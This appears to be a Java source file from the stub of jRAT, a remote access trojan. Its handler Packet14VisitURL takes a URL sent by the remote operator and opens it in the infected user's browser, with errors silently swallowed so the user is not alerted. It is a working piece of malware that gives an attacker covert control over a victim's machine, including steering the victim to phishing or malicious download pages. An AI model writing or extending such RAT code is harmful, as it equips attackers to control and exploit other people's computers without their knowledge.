package pro.jrat.stub.packets.incoming;

import java.net.URI;

import pro.jrat.stub.Connection;

public class Packet14VisitURL extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		try {
			java.awt.Desktop.getDesktop().browse(new URI(url));
		} catch (Exception ex) {

		}
	}

}
